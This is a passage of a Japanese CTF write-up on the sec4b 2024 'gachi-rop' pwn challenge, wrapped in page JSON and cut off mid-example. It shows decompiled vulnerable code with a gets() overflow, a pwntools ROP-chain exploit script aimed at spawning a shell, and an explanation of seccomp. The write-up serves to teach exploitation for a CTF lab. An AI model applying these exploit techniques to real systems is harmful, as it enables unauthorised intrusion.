{"componentChunkName":"component---src-templates-post-template-js","path":"/ctf-pwn-gachi-rop","result":{"data":{"markdownRemark":{"id":"95fd13fc-fcaf-5af3-bcf1-93f8147b8fbb","html":"<p>最近 Pwn を勉強中です。</p>\n<p>前回の記事 <a href=\"/ctf-pwn-og\">よちよち CTFer の Pwn 超入門 1 - FSB の基礎と ROP のテクニック 編-</a> に引き続き、今回は sec4b 2024 の gachi-rop という問題をテーマに、seccomp の回避手法と Shell Code の基礎について Pwn の入門テクニックとしてまとめていきます。</p>\n<!-- omit in toc -->\n<h2 id=\"もくじ\" style=\"position:relative;\"><a href=\"#%E3%82%82%E3%81%8F%E3%81%98\" aria-label=\"もくじ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>もくじ</h2>\n<ul>\n<li><a href=\"#%E5%95%8F%E9%A1%8C%E3%81%AE%E6%A6%82%E8%A6%81-gachi-roppwn\">問題の概要 gachi-rop(Pwn)</a></li>\n<li>\n<p><a href=\"#seccomp-%E3%81%AE%E6%A6%82%E8%A6%81%E3%81%A8%E5%AE%9F%E8%A3%85\">seccomp の概要と実装</a></p>\n<ul>\n<li><a href=\"#strict-mode-%E3%81%A7-seccomp-%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B\">Strict mode で seccomp を実装する</a></li>\n<li><a href=\"#libseccomp-%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%A6-seccomp-bpf-%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B\">libseccomp を使用して seccomp-bpf を実装する</a></li>\n<li><a href=\"#prctl-%E3%81%A7-seccomp-bpf-%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B\">prctl で seccomp-bpf を実装する</a></li>\n<li><a href=\"#seccomp-tools-%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B\">seccomp-tools を使用する</a></li>\n<li><a href=\"#%E5%95%8F%E9%A1%8C%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%81%AE-seccomp-%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B\">問題バイナリの seccomp フィルタを確認する</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#seccomp-%E3%81%AE%E5%9B%9E%E9%81%BF\">seccomp の回避</a></p>\n<ul>\n<li><a href=\"#%E4%BB%A3%E6%9B%BF%E3%81%AE%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B3%E3%83%BC%E3%83%AB%E3%81%AE%E5%88%A9%E7%94%A8\">代替のシステムコールの利用</a></li>\n<li><a href=\"#ptrace-%E3%81%AE%E6%82%AA%E7%94%A8\">ptrace の悪用</a></li>\n<li><a href=\"#32-bit-%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B3%E3%83%BC%E3%83%AB%E3%82%92%E5%88%A9%E7%94%A8%E3%81%99%E3%82%8B%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9%E6%89%8B%E6%B3%95\">32 bit システムコールを利用するバイパス手法</a></li>\n<li><a href=\"#32-bit-abi-%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9F-seccomp-%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9\">32 bit ABI を使用した seccomp バイパス</a></li>\n</ul>\n</li>\n<li><a href=\"#execve-%E3%81%A8-execveat-%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6\">execve と execveat について</a></li>\n<li>\n<p><a href=\"#shell-code-%E5%85%A5%E9%96%80\">Shell Code 入門</a></p>\n<ul>\n<li><a href=\"#shell-code-%E3%82%92%E4%BD%9C%E6%88%90%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B\">Shell Code を作成してみる</a></li>\n<li><a href=\"#execveat-%E3%81%A7%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B\">execveat でプログラムを実行する</a></li>\n<li><a href=\"#openreadwrite-%E3%81%A7%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E4%B8%AD%E8%BA%AB%E3%82%92%E5%87%BA%E5%8A%9B%E3%81%99%E3%82%8B\">open、read、write でファイルの中身を出力する</a></li>\n<li><a href=\"#getdents-%E3%81%A7%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%82%92%E5%8F%82%E7%85%A7%E3%81%99%E3%82%8B\">getdents でディレクトリエントリを参照する</a></li>\n<li><a href=\"#mprotect-%E3%81%AB%E3%82%88%E3%82%8B-nx-%E3%81%AE%E5%9B%9E%E9%81%BF\">mprotect による NX の回避</a></li>\n<li><a href=\"#shellcraft-%E3%81%A7-shell-code-%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B\">shellcraft で Shell Code を作成する</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%E8%A7%A3%E6%B3%95-1%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E5%87%BA%E5%8A%9B%E3%81%97%E3%81%A6-flag-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B\">解法 1：ファイルデータを出力して Flag を取得する</a></p>\n<ul>\n<li><a href=\"#mprotect-%E3%81%A7%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AB%E5%AE%9F%E8%A1%8C%E6%A8%A9%E9%99%90%E3%82%92%E4%BB%98%E4%B8%8E%E3%81%99%E3%82%8B\">mprotect でコードに実行権限を付与する</a></li>\n<li><a href=\"#%E4%BB%BB%E6%84%8F%E3%81%AE%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AB%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%80\">任意のアドレスにペイロードを埋め込む</a></li>\n<li><a href=\"#%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%93%E3%81%A0-shell-code-%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B\">埋め込んだ Shell Code を実行する</a></li>\n</ul>\n</li>\n<li><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\">まとめ</a></li>\n</ul>\n<h2 id=\"問題の概要-gachi-roppwn\" style=\"position:relative;\"><a href=\"#%E5%95%8F%E9%A1%8C%E3%81%AE%E6%A6%82%E8%A6%81-gachi-roppwn\" aria-label=\"問題の概要 gachi roppwn permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>問題の概要 gachi-rop(Pwn)</h2>\n<blockquote>\n<p>そろそろOne Gadgetにも飽きてきた？ガチROPの世界へようこそ！</p>\n</blockquote>\n<p>問題バイナリとして提供されている Dockerfile を読むと、以下のように flag.txt がランダムな MD5 ハッシュを付与された上で ctf4b ディレクトリに配置されることがわかります。</p>\n<div class=\"gatsby-highlight\" data-language=\"dockerfile\"><pre class=\"language-dockerfile\"><code class=\"language-dockerfile\"><span class=\"token instruction\"><span class=\"token keyword\">FROM</span> ubuntu:22.04@sha256:2af372c1e2645779643284c7dc38775e3dbbc417b2d784a27c5a9eb784014fb8 <span class=\"token keyword\">AS</span> base</span>\n<span class=\"token instruction\"><span class=\"token keyword\">WORKDIR</span> /app</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> gachi-rop run</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> flag.txt /flag.txt</span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> mkdir ctf4b</span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span>  mv /flag.txt ctf4b/flag-$(md5sum /flag.txt | awk <span class=\"token string\">'{print $1}'</span>).txt</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">FROM</span> pwn.red/jail</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> <span class=\"token options\"><span class=\"token property\">--from</span><span class=\"token punctuation\">=</span><span class=\"token string\">base</span></span> / /srv</span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> chmod +x /srv/app/run</span>\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> JAIL_TIME=60 JAIL_CPU=100 JAIL_MEM=10M</span></code></pre></div>\n<p>ディレクトリ構造は以下のようになっており、ファイル名を guess で特定することは困難なため、エクスプロイトによって Shell を取得するか、何らかの方法で Flag の記載されたファイル名を特定した上でそのファイルのコンテンツをリークすることが基本指針になりそうです。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 926px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/5ffc9e220dbe9208450b2cc4b081383a/69476/image-20240616185938530.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4ElEQVQoz62SzXLCMAyE3SROMCEhtmOHAWJDflpo3//5trImPXKih53RaORPWsliDCPmeYJzDju1gxDiPfWuhx88FMGqqoIs5XvAx/OB2z0SrIQ2GofmgIakdccFtrcIMXDTEEeofU35j9fAeAu4jle2e76cYQjaEcx5xwUp9/m1IhJ0WWa4y4BSqdfANE23TfMv+v55Yl0X3l+y17QN2/6znNaQDjdslvdkOc9zSClJBYqi2GLJsZimO06nAVmW8eO6rllt2zIwNfLe8y9I0GN3ZEfGGK7XWsNYA2st534BtLibZgcIWWkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5ffc9e220dbe9208450b2cc4b081383a/8ac56/image-20240616185938530.webp 240w,\n/static/5ffc9e220dbe9208450b2cc4b081383a/d3be9/image-20240616185938530.webp 480w,\n/static/5ffc9e220dbe9208450b2cc4b081383a/dafe9/image-20240616185938530.webp 926w\"\n              sizes=\"(max-width: 926px) 100vw, 926px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5ffc9e220dbe9208450b2cc4b081383a/8ff5a/image-20240616185938530.png 240w,\n/static/5ffc9e220dbe9208450b2cc4b081383a/e85cb/image-20240616185938530.png 480w,\n/static/5ffc9e220dbe9208450b2cc4b081383a/69476/image-20240616185938530.png 926w\"\n            sizes=\"(max-width: 926px) 100vw, 926px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5ffc9e220dbe9208450b2cc4b081383a/69476/image-20240616185938530.png\"\n            alt=\"image-20240616185938530\"\n            title=\"image-20240616185938530\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>そこで、この問題で提供されている問題バイナリを確認してみると、実行時にいきなり libc 関数のアドレスがリークされることを確認できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">int32_t main<span class=\"token punctuation\">(</span>int32_t argc, char** argv, char** envp<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    install_seccomp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    printf<span class=\"token punctuation\">(</span><span class=\"token string\">\"system@%p<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span>, system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    int64_t buf <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    int64_t var_10 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    printf<span class=\"token punctuation\">(</span><span class=\"token string\">\"Name: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    gets<span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    printf<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, gachi-rop-%s!!<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span>, <span class=\"token operator\">&amp;</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin class-name\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>また、明らかな BoF の脆弱性があり、Canary や PIE などの保護機構も無効化されているため、容易に ROPChain によるエクスプロイトが可能そうです。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 798px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/4eced87434f30787a15bf39dceb80964/898f6/image-20240616185455256.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABQklEQVQoz4WR23KCMBRFw0xtFRG0VgJeIEiQFk3tRcT+/4ethjjtTPvQPqzZ55acTLaYLyNUI9FmSV4v0U8HyieD3h8pdg15WTuybeXydKPYVjWl3qIKhZQxYRgym03xfR8hhEfT7IkXCeFowLN+oFoFNCpkPLztB/B+If5G2E05N4MBdzaOh4IkEKw8wfT/w9eFnudwebQYUZoUWYQkqwlZskLOJXI8JZ7cM7IMJzOGwczFd37EKIgYj32iaUQQBD8XVLWmMY+8vBmOb8+8vL+i65p1UbBRiizPHZssQ22v/5arHPVFn+cZ683aIXa7itpeYMyBZt9wPBpO7TuXy5nu0tKeT5y7k9PO1c6u3/NVu3x0tF1r51pE79bB7Kkfd2hdWvdKFvGCJE2sg5LYuvityVXTZWpfnbk56foxsY373if06LNmKZMu7gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4eced87434f30787a15bf39dceb80964/8ac56/image-20240616185455256.webp 240w,\n/static/4eced87434f30787a15bf39dceb80964/d3be9/image-20240616185455256.webp 480w,\n/static/4eced87434f30787a15bf39dceb80964/ce206/image-20240616185455256.webp 798w\"\n              sizes=\"(max-width: 798px) 100vw, 798px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4eced87434f30787a15bf39dceb80964/8ff5a/image-20240616185455256.png 240w,\n/static/4eced87434f30787a15bf39dceb80964/e85cb/image-20240616185455256.png 480w,\n/static/4eced87434f30787a15bf39dceb80964/898f6/image-20240616185455256.png 798w\"\n            sizes=\"(max-width: 798px) 100vw, 798px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4eced87434f30787a15bf39dceb80964/898f6/image-20240616185455256.png\"\n            alt=\"image-20240616185455256\"\n            title=\"image-20240616185455256\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>そこで、Shell を取得するために以下のような典型的な ROP Chain をペイロードとして送り込んでみました。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># Exploit</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Name: \"</span><span class=\"token punctuation\">)</span>\n\nsystem_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"@\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\nlibc_baseaddress <span class=\"token operator\">=</span> system_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x50d70</span>\nbinsh_addr <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x1d8678</span>\npop_rdi_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x001bbea1</span>\nret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012fc</span>\n\npayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n    <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> <span class=\"token string\">b\"B\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>\n    pop_rdi_ret<span class=\"token punctuation\">,</span>\n    binsh_addr<span class=\"token punctuation\">,</span>\n    ret<span class=\"token punctuation\">,</span>\n    system_addr\n<span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></code></pre></div>\n<p>しかし、このペイロードは意図した通りに <code class=\"language-text\">/bin/sh</code> を引数として system 関数を実行できるものの、Shell の取得には失敗してしまいます。</p>\n<p>エクスプロイト発行時の strace を取得してみると、以下のように  <code class=\"language-text\">/bin/sh</code> を引数としてシステムコール execve が発行された際にプロセスが終了しているようです。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/4f1f8f77c7e16209add8b024f7f0c3a7/22475/image-20240618205240678.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY042P23KCMBRFA6klHSEkIDcpOCre0Pr/f7dM4lRn+tSHPXvNSWblRMzXC5vNyG6/ZXTt2VpDVa1o2oaqrijLAq0zCtfLdEnm2M+stdRNTZal5CanKCzi537jcJyYrzOe+35N/91jnFRrTeukxpgQL/VzpZRLgvpSLD4XRFGEEOKZ0/nEftrhu+taUrdBkiThsFyV6FwHjuMY+SGRUj5ZvvmP8Mh0mNx3B4ZxCFv8Crp1Fx54Xf5HHmBHXbSyn2V3AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4f1f8f77c7e16209add8b024f7f0c3a7/8ac56/image-20240618205240678.webp 240w,\n/static/4f1f8f77c7e16209add8b024f7f0c3a7/d3be9/image-20240618205240678.webp 480w,\n/static/4f1f8f77c7e16209add8b024f7f0c3a7/e46b2/image-20240618205240678.webp 960w,\n/static/4f1f8f77c7e16209add8b024f7f0c3a7/525da/image-20240618205240678.webp 1039w\"\n              sizes=\"(max-width: 960px) 100vw, 960px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4f1f8f77c7e16209add8b024f7f0c3a7/8ff5a/image-20240618205240678.png 240w,\n/static/4f1f8f77c7e16209add8b024f7f0c3a7/e85cb/image-20240618205240678.png 480w,\n/static/4f1f8f77c7e16209add8b024f7f0c3a7/d9199/image-20240618205240678.png 960w,\n/static/4f1f8f77c7e16209add8b024f7f0c3a7/22475/image-20240618205240678.png 1039w\"\n            sizes=\"(max-width: 960px) 100vw, 960px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4f1f8f77c7e16209add8b024f7f0c3a7/d9199/image-20240618205240678.png\"\n            alt=\"image-20240618205240678\"\n            title=\"image-20240618205240678\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>これは、main 関数の先頭で実行されている install_seccomp 関数内で登録された seccomp によってプロセスが保護されているためです。</p>\n<p>実際に、バイナリにパッチを当ててこの install_seccomp 関数を実行しないようにさせると、同じペイロードで Shell を取得できるようになることを確認できます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/6f704a4051aea2059ca8e021df097980/4d108/image-20240618204908173.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAu0lEQVQY022PyQ6CQBBEhz0aEGEIRmhmwAMgiycx+v8fVg6daOJyeKnbqyrRqCP2iUS0TxEnKVJpMt5BCPEmO2TouhZd3+I89NC1wunUgKoSRIaKUJQFZCYhyijA1vPguq7B+RC9kHnGsnEaOCtFyPPcFMc8IIxCJGnCiGCzge/7sG2bsSzrR3ikArfbwsJpnjCMAy/WtYZSiuWr2DPDxL9F35AmPB53zJcZy3Llu0orc5cgpeSrazqOgyeuKWDKkPW/ogAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6f704a4051aea2059ca8e021df097980/8ac56/image-20240618204908173.webp 240w,\n/static/6f704a4051aea2059ca8e021df097980/d3be9/image-20240618204908173.webp 480w,\n/static/6f704a4051aea2059ca8e021df097980/e46b2/image-20240618204908173.webp 960w,\n/static/6f704a4051aea2059ca8e021df097980/f992d/image-20240618204908173.webp 1440w,\n/static/6f704a4051aea2059ca8e021df097980/882b9/image-20240618204908173.webp 1920w,\n/static/6f704a4051aea2059ca8e021df097980/3729c/image-20240618204908173.webp 2099w\"\n              sizes=\"(max-width: 960px) 100vw, 960px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6f704a4051aea2059ca8e021df097980/8ff5a/image-20240618204908173.png 240w,\n/static/6f704a4051aea2059ca8e021df097980/e85cb/image-20240618204908173.png 480w,\n/static/6f704a4051aea2059ca8e021df097980/d9199/image-20240618204908173.png 960w,\n/static/6f704a4051aea2059ca8e021df097980/07a9c/image-20240618204908173.png 1440w,\n/static/6f704a4051aea2059ca8e021df097980/29114/image-20240618204908173.png 1920w,\n/static/6f704a4051aea2059ca8e021df097980/4d108/image-20240618204908173.png 2099w\"\n            sizes=\"(max-width: 960px) 100vw, 960px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6f704a4051aea2059ca8e021df097980/d9199/image-20240618204908173.png\"\n            alt=\"image-20240618204908173\"\n            title=\"image-20240618204908173\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>以上から、この問題では seccomp の制限を解除するか、制限の範囲内で Flag を取得するための ROP Chain を構築することが基本指針となりそうです。</p>\n<h2 id=\"seccomp-の概要と実装\" style=\"position:relative;\"><a href=\"#seccomp-%E3%81%AE%E6%A6%82%E8%A6%81%E3%81%A8%E5%AE%9F%E8%A3%85\" aria-label=\"seccomp の概要と実装 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>seccomp の概要と実装</h2>\n<p>seccomp(secure computing mode) とは、プロセスが発行するシステムコールを制限することが可能な保護機構です。</p>\n<p>プロセスが自身に対して seccomp による保護を有効化すると、そのプロセスが許可されているシステムコール以外のシステムコールを実行しようとするとプロセスが終了されるようになります。</p>\n<p>seccomp は Linux カーネル 2.6.12 で初めて導入された後、Linux カーネル 3.5 からはより柔軟に制御が可能な seccomp-bpf が追加されています。</p>\n<p>従来の seccomp は Strict mode と呼ばれ、すでにオープン済みのファイルディスクリプタに対する read,write と、exit,sigreturn の 4 つのシステムコールのみを許可し、他のシステムコールを禁止する仕組みだったようです。</p>\n<p>また、より柔軟に制御が可能となった seccomp-bpf では、Berkeley Packet Filter (BPF) プログラムとして表現されたフィルタを使用して実行されるシステムコールを監視します。</p>\n<p>参考：<a href=\"https://www.kernel.org/doc/html/v4.19/userspace-api/seccomp_filter.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Seccomp BPF (フィルターを使用したセキュアコンピューティング) — Linux カーネルのドキュメント</a></p>\n<h3 id=\"strict-mode-で-seccomp-を実装する\" style=\"position:relative;\"><a href=\"#strict-mode-%E3%81%A7-seccomp-%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B\" aria-label=\"strict mode で seccomp を実装する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Strict mode で seccomp を実装する</h3>\n<p>実際に、<code class=\"language-text\">prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);</code> で Strict mode の seccomp を有効化することで execve の実行に失敗することを確認してみます。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token 